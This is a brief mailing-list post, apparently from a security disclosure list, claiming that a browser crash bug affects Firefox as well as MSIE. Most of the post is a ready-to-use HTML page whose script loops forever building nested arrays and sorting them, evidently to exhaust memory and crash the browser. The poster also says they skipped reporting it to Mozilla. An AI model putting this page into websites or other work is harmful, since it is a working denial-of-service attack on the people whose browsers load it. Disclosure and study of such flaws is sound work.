   Hi all,

   Same flaw works for Firefox as well as MSIE:

   <HTML>
     <SCRIPT> a = new Array(); while (1) { (a = new Array(a)).sort(); } 
</SCRIPT>
     <SCRIPT> a = new Array(); while (1) { (a = new Array(a)).sort(); } 
</SCRIPT>
   </HTML>

   I'd have loved to CC mozilla about this, but I didn't have the time 
to do the crash course "how to write a bug report" and go through all   
that bugzilla crap.

   Cheers,
